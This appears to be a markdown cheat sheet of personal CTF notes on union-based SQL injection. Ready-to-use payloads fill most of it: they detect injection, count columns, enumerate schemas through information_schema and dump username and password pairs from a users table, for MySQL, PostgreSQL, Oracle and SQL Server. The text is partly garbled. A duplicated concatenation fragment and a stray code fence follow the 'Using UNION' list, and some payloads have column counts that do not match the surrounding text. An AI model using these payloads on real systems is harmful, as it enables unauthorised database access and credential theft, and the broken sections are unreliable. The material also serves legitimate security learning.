---
title: SQL Injection - Union-Based Attacks
tags: [sql-injection, security, union-based]
---

# SQL Injection - Union-Based Attacks

## Overview
UNION-based SQL injection allows you to retrieve data from other tables by appending a UNION query to the original query.

## Prerequisites
- The number of columns must match between queries
- Data types must be compatible (or use NULL)

---

## Step-by-Step Process

### 1. Detect SQL Injection
Test for SQLi with simple payloads:
```
'
"
' OR '1'='1
' OR 1=1--
```

### 2. Determine Number of Columns
**Method 1: ORDER BY**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
Keep increasing until you get an error. If error at `ORDER BY 4`, there are 3 columns.

**Method 2: UNION SELECT NULL**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
Keep adding NULLs until no error.

### 3. Find Columns with String Data
Replace each NULL with a string to find which columns display data:
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### 4. Extract Data

**Get database version:**
```sql
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,version(),NULL--  (MySQL)
' UNION SELECT NULL,version,NULL FROM v$instance--  (Oracle)
' UNION SELECT NULL,sqlite_version(),NULL-- (sqllite)
```

**List all databases:**
```sql
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
```
**List all tables (from all databases):**
```sql
' UNION SELECT NULL,table_name FROM information_schema.tables--
```
**List tables in a database:**
```sql
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='database_name'--
```

***List columns in a table:***
**Find column names:**
```sql
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```
**Once you have the column names, extract data from those columns:**
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT NULL,username,password FROM users--
' UNION SELECT username,password,NULL FROM users--(Adjust NULLs based on the original query's column count)
```
**Extract data:**
```sql
' UNION SELECT NULL,username,password FROM users--
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## Common Tricks

### Concatenation (varies by database)
```sql
-- MySQL
CONCAT(str1, str2, str3)
CONCAT_WS(':', username, password)

-- PostgreSQL
str1 || str2 || str3

-- SQL Server
str1 + str2 + str3
```

### Using UNION in Different Databases
- **MySQL**: `UNION` is standard
- **PostgreSQL**: `UNION` is standard
- **Oracle**: `UNION` is standard
- **MSSQL**: `UNION` is standard

-- Oracle
str1 || str2 || str3

-- SQL Server
str1 + str2 + str3
```

### Comments (to terminate the query)
```sql
--          (SQL Server, PostgreSQL, MySQL)
#           (MySQL)
/* */       (All databases)
;%00        (Null byte, sometimes works)
```

### Multiple Results in One Column
```sql
' UNION SELECT NULL,GROUP_CONCAT(username,':',password),NULL FROM users--  (MySQL)
' UNION SELECT NULL,STRING_AGG(username||':'||password,','),NULL FROM users--  (PostgreSQL)
```

---

## Database-Specific Notes

### MySQL
- Use `information_schema` to enumerate
- Comments: `--` (with space), `#`, `/* */`
- String concat: `CONCAT()`

### PostgreSQL
- Use `information_schema` or `pg_catalog`
- Comments: `--`, `/* */`
- String concat: `||`

### Oracle
- **Every SELECT must have FROM** → use `FROM dual`
- Comments: `--`, `/* */`
- String concat: `||`
- Example: `' UNION SELECT NULL,NULL FROM dual--`

### SQL Server (MSSQL)
- Use `information_schema`
- Comments: `--`, `/* */`
- String concat: `+`

---

## Tips for CTFs
1. Always try NULL first when determining columns
2. If you can't see output, try different column positions
3. Watch for WAF/filters - may need encoding or alternative syntax
4. Save time: if you know it's 3 columns, start with `' UNION SELECT NULL,NULL,NULL--`
5. Use Burp Suite Repeater to test payloads quickly

---

## Common Errors & Fixes

**"The used SELECT statements have a different number of columns"**
- Add/remove columns from your UNION query

**"Invalid use of group function"**
- You're using aggregates wrong, wrap in subquery

**No output visible**
- Try different column positions for your payload
- Check if results are on a different page/response

**"All queries combined using a UNION must have the same number of expressions"**
- Same as first error - match column count

---

## Quick Reference Payloads

```sql
# Determine columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# Basic union (3 columns example)
' UNION SELECT NULL,NULL,NULL--

# Get database name
' UNION SELECT NULL,database(),NULL--

# Get tables
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

# Get columns
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# Extract data
' UNION SELECT NULL,username,password FROM users--
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```